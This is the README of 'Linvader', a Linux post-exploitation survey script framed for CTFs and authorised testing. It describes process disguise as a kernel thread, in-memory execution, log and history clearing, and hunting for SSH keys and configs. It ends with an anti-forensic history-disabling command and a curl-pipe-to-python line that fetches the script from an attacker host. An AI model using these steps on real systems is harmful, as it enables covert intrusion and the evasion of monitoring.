# Linvader
Survey Script for Linux machines with a twist.
README.md
## OVERVIEW
    This is meant for educational purposes only.  I have only tested this on my local kali linux vm, so results may vary.
    I started this project for automation when doing a computer survey for CTF events and things of the sorts.  I thought it would be fun to make it as stealthy as possible, thus this was born...with some help from claude AI

    This script will clear various logs  before and after running for redundancy 

    When viewing processes in kali, ps -e, top, or htop, this will appear as migration/0 for obfuscation and a high process thread number, ps aux will still show python3 though

## IMPORTANT NOTES
    NOTE: This script will still show up as python3 if you run "ps aux".  It is possible to obfuscate this further by converting it into a BINARY FILE, but that requires a few more steps
    NOTE: This script will continue to run even if the process is not renamed.  This is found on line 28 if you DO NOT want the script to still run
    NOTE: if you do not want to run the script as root: sudo chown $USER:$USER Linvader.py && chmod 644 Linvader.py

## WHAT IS PREVENTED
    Shell History (cleared by "unset HISTFILE") This is run manually first thing on target 
    Disk files (runs in memory)
    Porcess name in ps -e, top or htop will be migration/0 for obfuscation

## WHAT IS STILL LOGGED
    System Logs (/var/log/syslog, /var/log/auth.log)
    Network Connection to YOUR_IP:8000
    Audit logs (if auditd is running, /var/log/audit/audit.log)



FEATURES
- System information gathering
- User and privilege enumeration
- Network configuration analysis
- Process and service discovery
- SUID/SGID binary detection
- Interesting file discovery
- Automatic history cleaning
- Process name obfuscation

WHAT IT ENUMERATES
System Information - OS, kernel, architecture
User Information - Current user, sudo permissions, all users
Network Configuration - IPs, routes, connections, open ports
Running Processes - Process list, root processes
Installed Software - Packages, development tools
File Permissions - SUID/SGID binaries, world-writable files
Interesting Files - SSH keys, history files, configs, databases
Services & Cron Jobs - Active services, scheduled tasks
Environment Variables - All env vars
Security Tools - Firewall, SELinux, AppArmor status

STEALTH FEATURES 
Runs entirely in memory (no disk artifacts)
Process disguised as migration/0 (kernel thread)
Automatic command history clearing
No file-based logging

REQUIREMENTS
Python 3.x
Standard Linux utilities (ps, ss/netstat, ip/ifconfig)

DISCLAIMER
For authorized penetration testing and CTF environments only.



EXECUTE IN MEMORY ON TARGET 
    ON HOST MACHINE:
        python3 -m http.server 8000

    ON TARGET:
        # Disable history first
         unset HISTFILE && set +o history
        # Run the Script
            curl http://YOUR_IP:8000/Linvader.py | python3
        

